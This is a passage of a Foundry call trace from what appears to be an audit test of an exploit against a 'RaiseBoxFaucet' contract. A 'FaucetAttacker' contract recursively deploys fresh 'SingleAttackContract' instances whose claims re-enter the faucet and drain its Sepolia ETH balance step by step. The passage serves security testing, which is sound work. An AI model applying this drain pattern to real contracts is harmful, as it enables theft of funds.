    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 865000000000000000 [8.65e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x04cbd965d0C0CE0b105C1C61FB347E1CE7f96dFe
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 27) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17759160] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17758401] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17722233] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17714575] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 860000000000000000 [8.6e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x9e3073E4326e2D83A76Fba5a67Dd8059c872Ad43
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 28) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17457191] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17456432] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17420264] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17412606] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 855000000000000000 [8.55e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xE911B3aB476fc7c9c850600fc56E2e82F091Bf3C
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 29) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17155222] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17154463] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17118295] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [17110637] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 850000000000000000 [8.5e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x902353f10B7AcF30D2133fEd65BFb22a8Dc01611
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 30) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16853253] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16852494] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16816326] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16808668] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 845000000000000000 [8.45e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x6133eC00f176EA0e7b401D454AA648EB534f1FC6
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 31) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16551284] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16550525] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16514357] SingleAttackContract::receive{value: 5000000000000000}()
